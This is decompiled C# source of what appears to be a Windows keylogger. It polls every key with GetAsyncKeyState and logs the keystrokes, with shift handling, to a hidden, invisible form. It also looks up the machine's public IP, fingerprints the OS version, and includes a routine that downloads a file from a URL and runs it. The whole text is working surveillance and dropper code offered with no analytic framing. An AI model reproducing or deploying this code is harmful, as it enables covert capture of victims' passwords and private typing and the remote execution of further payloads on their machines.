						goto IL_111b;
						IL_02c2:
						num = 63;
						object_1 = GetAsyncKeyState(189);
						goto IL_02da;
						IL_02da:
						num = 64;
						if (Operators.ConditionalCompareObjectEqual(object_1, (object)(-32767), false))
						{
							goto IL_02f5;
						}
						goto IL_0329;
						IL_02f5:
						num = 65;
						if (!method_2())
						{
							goto IL_0300;
						}
						goto IL_0313;
						IL_0300:
						num = 66;
						object_2 = "-";
						goto IL_111b;
						IL_0313:
						num = 68;
						goto IL_0316;
						IL_0316:
						num = 69;
						object_2 = "_";
						goto IL_111b;
						IL_0329:
						num = 74;
						object_1 = GetAsyncKeyState(190);
						goto IL_0341;
						IL_0341:
						num = 75;
						if (Operators.ConditionalCompareObjectEqual(object_1, (object)(-32767), false))
						{
							goto IL_035c;
						}
						goto IL_0390;
						IL_035c:
						num = 76;
						if (!method_2())
						{
							goto IL_0367;
						}
						goto IL_037a;
						IL_0367:
						num = 77;
						object_2 = ".";
						goto IL_111b;
						IL_037a:
						num = 79;
						goto IL_037d;
						IL_037d:
						num = 80;
						object_2 = ">";
						goto IL_111b;
						IL_0390:
						num = 85;
						object_1 = GetAsyncKeyState(191);
						goto IL_03a8;
						IL_03a8:
						num = 86;
						if (Operators.ConditionalCompareObjectEqual(object_1, (object)(-32767), false))
						{
							goto IL_03c3;
						}
						goto IL_03f7;
						IL_03c3:
						num = 87;
						if (!method_2())
						{
							goto IL_03ce;
						}
						goto IL_03e1;
						IL_03ce:
						num = 88;
						object_2 = "/";
						goto IL_111b;
						IL_03e1:
						num = 90;
						goto IL_03e4;
						IL_03e4:
						num = 91;
						object_2 = "?";
						goto IL_111b;
						IL_03f7:
						num = 96;
						object_1 = GetAsyncKeyState(192);
						goto IL_040f;
						IL_040f:
						num = 97;
						if (Operators.ConditionalCompareObjectEqual(object_1, (object)(-32767), false))
						{
							goto IL_042a;
						}
						goto IL_045e;
						IL_042a:
						num = 98;
						if (!method_2())
						{
							goto IL_0435;
						}
						goto IL_0448;
						IL_0435:
						num = 99;
						object_2 = "`";
						goto IL_111b;
						IL_0448:
						num = 101;
						goto IL_044b;
						IL_044b:
						num = 102;
						object_2 = "~";
						goto IL_111b;
						IL_045e:
						num = 107;
						object_1 = GetAsyncKeyState(96);
						goto IL_0473;
						IL_0473:
						num = 108;
						if (Operators.ConditionalCompareObjectEqual(object_1, (object)(-32767), false))
						{
							goto IL_048e;
						}
						goto IL_04c2;
						IL_048e:
						num = 109;
						if (!method_2())
						{
							goto IL_0499;
						}
						goto IL_04ac;
						IL_0499:
						num = 110;
						object_2 = "0";
						goto IL_111b;
						IL_04ac:
						num = 112;
						goto IL_04af;
						IL_04af:
						num = 113;
						object_2 = ")";
						goto IL_111b;
						IL_04c2:
						num = 118;
						object_1 = GetAsyncKeyState(97);
						goto IL_04d7;
						IL_04d7:
						num = 119;
						if (Operators.ConditionalCompareObjectEqual(object_1, (object)(-32767), false))
						{
							goto IL_04f2;
						}
						goto IL_0526;
						IL_04f2:
						num = 120;
						if (!method_2())
						{
							goto IL_04fd;
						}
						goto IL_0510;
						IL_04fd:
						num = 121;
						object_2 = "1";
						goto IL_111b;
						IL_0510:
						num = 123;
						goto IL_0513;
						IL_0513:
						num = 124;
						object_2 = "!";
						goto IL_111b;
						IL_0526:
						num = 129;
						object_1 = GetAsyncKeyState(98);
						goto IL_053e;
						IL_053e:
						num = 130;
						if (Operators.ConditionalCompareObjectEqual(object_1, (object)(-32767), false))
						{
							goto IL_055c;
						}
						goto IL_059c;
						IL_055c:
						num = 131;
						if (!method_2())
						{
							goto IL_056a;
						}
						goto IL_0580;
						IL_056a:
						num = 132;
						object_2 = "2";
						goto IL_111b;
						IL_0580:
						num = 134;
						goto IL_0586;
						IL_0586:
						num = 135;
						object_2 = "@";
						goto IL_111b;
						IL_059c:
						num = 140;
						object_1 = GetAsyncKeyState(99);
						goto IL_05b4;
						IL_05b4:
						num = 141;
						if (Operators.ConditionalCompareObjectEqual(object_1, (object)(-32767), false))
						{
							goto IL_05d2;
						}
						goto IL_0612;
						IL_05d2:
						num = 142;
						if (!method_2())
						{
							goto IL_05e0;
						}
						goto IL_05f6;
						IL_05e0:
						num = 143;
						object_2 = "3";
						goto IL_111b;
						IL_05f6:
						num = 145;
						goto IL_05fc;
						IL_05fc:
						num = 146;
						object_2 = "#";
						goto IL_111b;
						IL_0612:
						num = 151;
						object_1 = GetAsyncKeyState(100);
						goto IL_062a;
						IL_062a:
						num = 152;
						if (Operators.ConditionalCompareObjectEqual(object_1, (object)(-32767), false))
						{
							goto IL_0648;
						}
						goto IL_0688;
						IL_0648:
						num = 153;
						if (!method_2())
						{
							goto IL_0656;
						}
						goto IL_066c;
						IL_0656:
						num = 154;
						object_2 = "4";
						goto IL_111b;
						IL_066c:
						num = 156;
						goto IL_0672;
						IL_0672:
						num = 157;
						object_2 = "$";
						goto IL_111b;
						IL_0688:
						num = 162;
						object_1 = GetAsyncKeyState(101);
						goto IL_06a0;
						IL_06a0:
						num = 163;
						if (Operators.ConditionalCompareObjectEqual(object_1, (object)(-32767), false))
						{
							goto IL_06be;
						}
						goto IL_06fe;
						IL_06be:
						num = 164;
						if (!method_2())
						{
							goto IL_06cc;
						}
						goto IL_06e2;
						IL_06cc:
						num = 165;
						object_2 = "5";
						goto IL_111b;
						IL_06e2:
						num = 167;
						goto IL_06e8;
						IL_06e8:
						num = 168;
						object_2 = "%";
						goto IL_111b;
						IL_06fe:
						num = 173;
						object_1 = GetAsyncKeyState(102);
						goto IL_0716;
						IL_0716:
						num = 174;
						if (Operators.ConditionalCompareObjectEqual(object_1, (object)(-32767), false))
						{
							goto IL_0734;
						}
						goto IL_0774;
						IL_0734:
						num = 175;
						if (!method_2())
						{
							goto IL_0742;
						}
						goto IL_0758;
						IL_0742:
						num = 176;
						object_2 = "6";
						goto IL_111b;
						IL_0758:
						num = 178;
						goto IL_075e;
						IL_075e:
						num = 179;
						object_2 = "7";
						goto IL_111b;
						IL_0774:
						num = 184;
						object_1 = GetAsyncKeyState(103);
						goto IL_078c;
						IL_078c:
						num = 185;
						if (Operators.ConditionalCompareObjectEqual(object_1, (object)(-32767), false))
						{
							goto IL_07aa;
						}
						goto IL_07ea;
						IL_07aa:
						num = 186;
						if (!method_2())
						{
							goto IL_07b8;
						}
						goto IL_07ce;
						IL_07b8:
						num = 187;
						object_2 = "7";
						goto IL_111b;
						IL_07ce:
						num = 189;
						goto IL_07d4;
						IL_07d4:
						num = 190;
						object_2 = "&";
						goto IL_111b;
						IL_07ea:
						num = 195;
						object_1 = GetAsyncKeyState(104);
						goto IL_0802;
						IL_0802:
						num = 196;
						if (Operators.ConditionalCompareObjectEqual(object_1, (object)(-32767), false))
						{
							goto IL_0820;
						}
						goto IL_0860;
						IL_0820:
						num = 197;
						if (!method_2())
						{
							goto IL_082e;
						}
						goto IL_0844;
						IL_082e:
						num = 198;
						object_2 = "8";
						goto IL_111b;
						IL_0844:
						num = 200;
						goto IL_084a;
						IL_084a:
						num = 201;
						object_2 = "*";
						goto IL_111b;
						IL_0860:
						num = 206;
						object_1 = GetAsyncKeyState(105);
						goto IL_0878;
						IL_0878:
						num = 207;
						if (Operators.ConditionalCompareObjectEqual(object_1, (object)(-32767), false))
						{
							goto IL_0896;
						}
						goto IL_08d6;
						IL_0896:
						num = 208;
						if (!method_2())
						{
							goto IL_08a4;
						}
						goto IL_08ba;
						IL_08a4:
						num = 209;
						object_2 = "9";
						goto IL_111b;
						IL_08ba:
						num = 211;
						goto IL_08c0;
						IL_08c0:
						num = 212;
						object_2 = "(";
						goto IL_111b;
						IL_08d6:
						num = 217;
						object_1 = GetAsyncKeyState(106);
						goto IL_08ee;
						IL_08ee:
						num = 218;
						if (Operators.ConditionalCompareObjectEqual(object_1, (object)(-32767), false))
						{
							goto IL_090c;
						}
						goto IL_0960;
						IL_090c:
						num = 219;
						if (!method_2())
						{
							goto IL_091a;
						}
						goto IL_0944;
						IL_091a:
						num = 220;
						object_2 = "*";
						goto IL_092b;
						IL_092b:
						num = 221;
						int_0++;
						goto IL_111b;
						IL_0944:
						num = 223;
						goto IL_094a;
						IL_094a:
						num = 224;
						object_2 = "";
						goto IL_111b;
						IL_0960:
						num = 228;
						object_1 = GetAsyncKeyState(107);
						goto IL_0978;
						IL_0978:
						num = 229;
						if (Operators.ConditionalCompareObjectEqual(object_1, (object)(-32767), false))
						{
							goto IL_0996;
						}
						goto IL_09d6;
						IL_0996:
						num = 230;
						if (!method_2())
						{
							goto IL_09a4;
						}
						goto IL_09ba;
						IL_09a4:
						num = 231;
						object_2 = "+";
						goto IL_111b;
						IL_09ba:
						num = 233;
						goto IL_09c0;
						IL_09c0:
						num = 234;
						object_2 = "=";
						goto IL_111b;
						IL_09d6:
						num = 239;
						object_1 = GetAsyncKeyState(108);
						goto IL_09ee;
						IL_09ee:
						num = 240;
						if (Operators.ConditionalCompareObjectEqual(object_1, (object)(-32767), false))
						{
							goto IL_0a0c;
						}
						goto IL_0a22;
						IL_0a0c:
						num = 241;
						object_2 = "";
						goto IL_111b;
						IL_0a22:
						num = 244;
						object_1 = GetAsyncKeyState(109);
						goto IL_0a3a;
						IL_0a3a:
						num = 245;
						if (Operators.ConditionalCompareObjectEqual(object_1, (object)(-32767), false))
						{
							goto IL_0a58;
						}
						goto IL_0a98;
						IL_0a58:
						num = 246;
						if (!method_2())
						{
							goto IL_0a66;
						}
						goto IL_0a7c;
						IL_0a66:
						num = 247;
						object_2 = "-";
						goto IL_111b;
						IL_0a7c:
						num = 249;
						goto IL_0a82;
						IL_0a82:
						num = 250;
						object_2 = "_";
						goto IL_111b;
						IL_0a98:
						num = 255;
						object_1 = GetAsyncKeyState(110);
						goto IL_0ab0;
						IL_0ab0:
						num = 256;
						if (Operators.ConditionalCompareObjectEqual(object_1, (object)(-32767), false))
						{
							goto IL_0ace;
						}
						goto IL_0b0e;
						IL_0ace:
						num = 257;
						if (!method_2())
						{
							goto IL_0adc;
						}
						goto IL_0af2;
						IL_0adc:
						num = 258;
						object_2 = ".";
						goto IL_111b;
						IL_0af2:
						num = 260;
						goto IL_0af8;
						IL_0af8:
						num = 261;
						object_2 = ">";
						goto IL_111b;
						IL_0b0e:
						num = 266;
						object_1 = GetAsyncKeyState(111);
						goto IL_0b26;
						IL_0b26:
						num = 267;
						if (Operators.ConditionalCompareObjectEqual(object_1, (object)(-32767), false))
						{
							goto IL_0b44;
						}
						goto IL_0b5a;
						IL_0b44:
						num = 268;
						object_2 = "/";
						goto IL_111b;
						IL_0b5a:
						num = 272;
						object_1 = GetAsyncKeyState(2);
						goto IL_0b71;
						IL_0b71:
						num = 273;
						if (Operators.ConditionalCompareObjectEqual(object_1, (object)(-32767), false))
						{
							goto IL_0b8f;
						}
						goto IL_0bcf;
						IL_0b8f:
						num = 274;
						if (!method_2())
						{
							goto IL_0b9d;
						}
						goto IL_0bb3;
						IL_0b9d:
						num = 275;
						object_2 = "/";
						goto IL_111b;
						IL_0bb3:
						num = 277;
						goto IL_0bb9;
						IL_0bb9:
						num = 278;
						object_2 = "?";
						goto IL_111b;
						IL_0bcf:
						num = 283;
						object_1 = GetAsyncKeyState(220);
						goto IL_0bea;
						IL_0bea:
						num = 284;
						if (Operators.ConditionalCompareObjectEqual(object_1, (object)(-32767), false))
						{
							goto IL_0c08;
						}
						goto IL_0c48;
						IL_0c08:
						num = 285;
						if (!method_2())
						{
							goto IL_0c16;
						}
						goto IL_0c2c;
						IL_0c16:
						num = 286;
						object_2 = "\\";
						goto IL_111b;
						IL_0c2c:
						num = 288;
						goto IL_0c32;
						IL_0c32:
						num = 289;
						object_2 = "|";
						goto IL_111b;
						IL_0c48:
						num = 294;
						object_1 = GetAsyncKeyState(222);
						goto IL_0c63;
						IL_0c63:
						num = 295;
						if (Operators.ConditionalCompareObjectEqual(object_1, (object)(-32767), false))
						{
							goto IL_0c81;
						}
						goto IL_0cc3;
						IL_0c81:
						num = 296;
						if (!method_2())
						{
							goto IL_0c8f;
						}
						goto IL_0ca5;
						IL_0c8f:
						num = 297;
						object_2 = "'";
						goto IL_111b;
						IL_0ca5:
						num = 299;
						goto IL_0cab;
						IL_0cab:
						num = 300;
						object_2 = '"';
						goto IL_111b;
						IL_0cc3:
						num = 305;
						object_1 = GetAsyncKeyState(221);
						goto IL_0cde;
						IL_0cde:
						num = 306;
						if (Operators.ConditionalCompareObjectEqual(object_1, (object)(-32767), false))
						{
							goto IL_0cfc;
						}
						goto IL_0d3c;
						IL_0cfc:
						num = 307;
						if (!method_2())
						{
							goto IL_0d0a;
						}
						goto IL_0d20;
						IL_0d0a:
						num = 308;
						object_2 = "]";
						goto IL_111b;
						IL_0d20:
						num = 310;
						goto IL_0d26;
						IL_0d26:
						num = 311;
						object_2 = "}";
						goto IL_111b;
						IL_0d3c:
						num = 316;
						object_1 = GetAsyncKeyState(219);
						goto IL_0d57;
						IL_0d57:
						num = 317;
						if (Operators.ConditionalCompareObjectEqual(object_1, (object)(-32767), false))
						{
							goto IL_0d75;
						}
						goto IL_0db5;
						IL_0d75:
						num = 318;
						if (!method_2())
						{
							goto IL_0d83;
						}
						goto IL_0d99;
						IL_0d83:
						num = 319;
						object_2 = "[";
						goto IL_111b;
						IL_0d99:
						num = 321;
						goto IL_0d9f;
						IL_0d9f:
						num = 322;
						object_2 = "{";
						goto IL_111b;
						IL_0db5:
						num = 327;
						if (ForLoopControl.ForLoopInitObj(object_0, (object)48, (object)57, (object)1, ref obj, ref object_0))
						{
							goto IL_0de7;
						}
						goto IL_0fab;
						IL_0de7:
						num = 328;
						object_1 = GetAsyncKeyState(Conversions.ToInteger(object_0));
						goto IL_0e08;
						IL_0e08:
						num = 329;
						if (!Operators.ConditionalCompareObjectEqual(object_1, (object)(-32767), false))
						{
							goto IL_0e26;
						}
						goto IL_0e45;
						IL_0e26:
						num = 371;
						if (ForLoopControl.ForNextCheckObj(object_0, obj, ref object_0))
						{
							goto IL_0de7;
						}
						goto IL_0fab;
						IL_0e45:
						num = 330;
						if (method_2())
						{
							goto IL_0e56;
						}
						goto IL_0f7f;
						IL_0e56:
						num = 331;
						switch (Conversion.Val(Strings.Chr(Conversions.ToInteger(object_0))))
						{
						case 0:
							break;
						case 1:
							goto IL_0eb9;
						case 2:
							goto IL_0ecf;
						case 3:
							goto IL_0ee5;
						case 4:
							goto IL_0efb;
						case 5:
							goto IL_0f11;
						case 6:
							goto IL_0f27;
						case 7:
							goto IL_0f3d;
						case 8:
							goto IL_0f53;
						case 9:
							goto IL_0f69;
						default:
							goto IL_111b;
						}
						goto IL_0ea3;
						IL_0f69:
						num = 359;
						object_2 = "(";
						goto IL_111b;
						IL_0f53:
						num = 356;
						object_2 = "*";
						goto IL_111b;
						IL_0f3d:
						num = 353;
						object_2 = "&";
						goto IL_111b;
						IL_0f27:
						num = 350;
						object_2 = "^";
						goto IL_111b;
						IL_0f11:
						num = 347;
						object_2 = "%";
						goto IL_111b;
						IL_0efb:
						num = 344;
						object_2 = "$";
						goto IL_111b;
						IL_0ee5:
						num = 341;
						object_2 = "#";
						goto IL_111b;
						IL_0ecf:
						num = 338;
						object_2 = "@";
						goto IL_111b;
						IL_0eb9:
						num = 335;
						object_2 = "!";
						goto IL_111b;
						IL_0ea3:
						num = 362;
						object_2 = ")";
						goto IL_111b;
						IL_0f7f:
						num = 365;
						goto IL_0f85;
						IL_0f85:
						num = 366;
						object_2 = Strings.Chr(Conversions.ToInteger(object_0));
						goto IL_111b;
						IL_0fab:
						num = 372;
						if (!ForLoopControl.ForLoopInitObj(object_0, (object)65, (object)128, (object)1, ref obj2, ref object_0))
						{
							break;
						}
						goto IL_0fe0;
						IL_0fe0:
						num = 373;
						object_1 = GetAsyncKeyState(Conversions.ToInteger(object_0));
						goto IL_1001;
						IL_1001:
						num = 374;
						if (!Operators.ConditionalCompareObjectEqual(object_1, (object)(-32767), false))
						{
							goto IL_101f;
						}
						goto IL_103e;
						IL_101f:
						num = 394;
						if (!ForLoopControl.ForNextCheckObj(object_0, obj2, ref object_0))
						{
							break;
						}
						goto IL_0fe0;
						IL_103e:
						num = 375;
						if (!method_2())
						{
							goto IL_104c;
						}
						goto IL_10b3;
						IL_104c:
						num = 376;
						if (method_1())
						{
							goto IL_105a;
						}
						goto IL_1085;
						IL_105a:
						num = 377;
						object_2 = Strings.UCase(Strings.Chr(Conversions.ToInteger(object_0)));
						goto IL_111b;
						IL_1085:
						num = 379;
						goto IL_108b;
						IL_108b:
						num = 380;
						object_2 = Strings.LCase(Strings.Chr(Conversions.ToInteger(object_0)));
						goto IL_111b;
						IL_10b3:
						num = 383;
						goto IL_10b9;
						IL_10b9:
						num = 384;
						if (!method_1())
						{
							goto IL_10c7;
						}
						goto IL_10ef;
						IL_10c7:
						num = 385;
						object_2 = Strings.UCase(Strings.Chr(Conversions.ToInteger(object_0)));
						goto IL_111b;
						IL_10ef:
						num = 387;
						goto IL_10f5;
						IL_10f5:
						num = 388;
						object_2 = Strings.LCase(Strings.Chr(Conversions.ToInteger(object_0)));
						goto IL_111b;
						IL_111b:
						num = 397;
						if (int_0 > int_1)
						{
							goto IL_112f;
						}
						goto IL_1152;
						IL_112f:
						num = 398;
						int_0 = 0;
						goto IL_113c;
						IL_113c:
						num = 399;
						((TextBoxBase)vmethod_4()).AppendText("\r\n");
						goto IL_1152;
						IL_1152:
						num = 401;
						if (Operators.ConditionalCompareObjectNotEqual(object_2, (object)"", false))
						{
							goto IL_116b;
						}
						goto IL_1187;
						IL_116b:
						num = 402;
						((TextBoxBase)vmethod_4()).AppendText(Conversions.ToString(object_2));
						goto IL_1187;
						end_IL_0000_2:
						break;
					}
					num = 395;
					Application.DoEvents();
					break;
				}
				end_IL_0000:;
			}
			catch (object obj3) when (obj3 is Exception && num3 != 0 && num2 == 0)
			{
				ProjectData.SetProjectError((Exception)obj3);
				try0000_dispatch = 6852;
				continue;
			}
			throw ProjectData.CreateProjectError(-2146828237);
			continue;
			end_IL_0000_3:
			break;
		}
		if (num2 != 0)
		{
			ProjectData.ClearProjectError();
		}
	}

	private IPAddress method_4()
	{
		using WebClient webClient = new WebClient();
		return IPAddress.Parse(Encoding.ASCII.GetString(webClient.DownloadData("http://automation.whatismyip.com/n09230945.asp")));
	}

	public static string smethod_1()
	{
		OperatingSystem oSVersion = Environment.OSVersion;
		string result = "UN";
		switch (oSVersion.Platform)
		{
		case PlatformID.Win32Windows:
			switch (oSVersion.Version.Minor)
			{
			case 0:
				result = "95";
				break;
			case 10:
				result = "98";
				break;
			case 90:
				result = "ME";
				break;
			}
			break;
		case PlatformID.Win32NT:
			switch (oSVersion.Version.Major)
			{
			case 3:
				result = "NT";
				break;
			case 4:
				result = "NT";
				break;
			case 5:
				if (oSVersion.Version.Minor == 0)
				{
					result = "2K";
				}
				else if (oSVersion.Version.Minor == 1)
				{
					result = "XP";
				}
				else if (oSVersion.Version.Minor == 2)
				{
					result = "2K3";
				}
				break;
			case 6:
				result = "VS";
				if (oSVersion.Version.Minor == 0)
				{
					result = "VS";
				}
				else if (oSVersion.Version.Minor == 1)
				{
					result = "W7";
				}
				break;
			}
			break;
		}
		return result;
	}

	private bool method_5(string string_11, string string_12)
	{
		if (((ServerComputer)Class12.smethod_0()).get_FileSystem().FileExists(string_12))
		{
			FileSystem.Kill(string_12);
		}
		try
		{
			((ServerComputer)Class12.smethod_0()).get_Network().DownloadFile(string_11, string_12);
			Process.Start(string_12);
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			bool result = false;
			ProjectData.ClearProjectError();
			return result;
		}
		return true;
	}

	public int method_6(int int_2, int int_3)
	{
		Random random = new Random();
		return random.Next(int_2, int_3);
	}

	private static string smethod_2(string string_11)
	{
		StringBuilder stringBuilder = new StringBuilder();
		int length = string_11.Length;
		checked
		{
			for (int i = 1; i <= length; i++)
			{
				int num = string_11.Length - i + 1;
				stringBuilder.Append(Strings.Mid(string_11, num, 1));
			}
			stringBuilder.ToString();
			return stringBuilder.ToString();
		}
	}

	protected override void Dispose(bool disposing)
	{
		try
		{
			if (disposing && icontainer_0 != null)
			{
				icontainer_0.Dispose();
			}
		}
		finally
		{
			((Form)this).Dispose(disposing);
		}
	}

	private void InitializeComponent()
	{
		//IL_0012: Unknown result type (might be due to invalid IL or missing references)
		//IL_001c: Expected O, but got Unknown
		//IL_0023: Unknown result type (might be due to invalid IL or missing references)
		//IL_002d: Expected O, but got Unknown
		//IL_002e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0038: Expected O, but got Unknown
		icontainer_0 = new Container();
		vmethod_1(new Timer(icontainer_0));
		vmethod_3(new Timer(icontainer_0));
		vmethod_5(new TextBox());
		((Control)this).SuspendLayout();
		vmethod_2().set_Interval(1);
		TextBox obj = vmethod_4();
		Point location = new Point(12, 12);
		((Control)obj).set_Location(location);
		((TextBoxBase)vmethod_4()).set_MaxLength(327670000);
		vmethod_4().set_Multiline(true);
		((Control)vmethod_4()).set_Name("TextBox1");
		TextBox obj2 = vmethod_4();
		Size size = new Size(260, 238);
		((Control)obj2).set_Size(size);
		((Control)vmethod_4()).set_TabIndex(0);
		SizeF autoScaleDimensions = new SizeF(6f, 13f);
		((ContainerControl)this).set_AutoScaleDimensions(autoScaleDimensions);
		((ContainerControl)this).set_AutoScaleMode((AutoScaleMode)1);
		size = new Size(284, 262);
		((Form)this).set_ClientSize(size);
		((Control)this).get_Controls().Add((Control)(object)vmethod_4());
		((Control)this).set_Name("Form1");
		((Form)this).set_Opacity(0.0);
		((Form)this).set_ShowIcon(false);
		((Form)this).set_ShowInTaskbar(false);
		((Form)this).set_Text("Form1");
		((Form)this).set_WindowState((FormWindowState)1);
		((Control)this).ResumeLayout(false);
		((Control)this).PerformLayout();
	}

	[SpecialName]
	internal virtual Timer vmethod_0()
	{
		return timer_0;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	internal virtual void vmethod_1(Timer timer_2)
	{
		if (timer_0 != null)
		{
			timer_0.remove_Tick((EventHandler)timer_0_Tick);
		}
		timer_0 = timer_2;
		if (timer_0 != null)
		{
			timer_0.add_Tick((EventHandler)timer_0_Tick);
		}
	}

	[SpecialName]
	internal virtual Timer vmethod_2()
	{
		return timer_1;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	internal virtual void vmethod_3(Timer timer_2)
	{
		if (timer_1 != null)
		{
			timer_1.remove_Tick((EventHandler)timer_1_Tick);
		}
		timer_1 = timer_2;
		if (timer_1 != null)
		{
			timer_1.add_Tick((EventHandler)timer_1_Tick);
		}
	}

	[SpecialName]
	internal virtual TextBox vmethod_4()
	{
		return textBox_0;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	internal virtual void vmethod_5(TextBox textBox_1)
	{
		textBox_0 = textBox_1;
	}
}
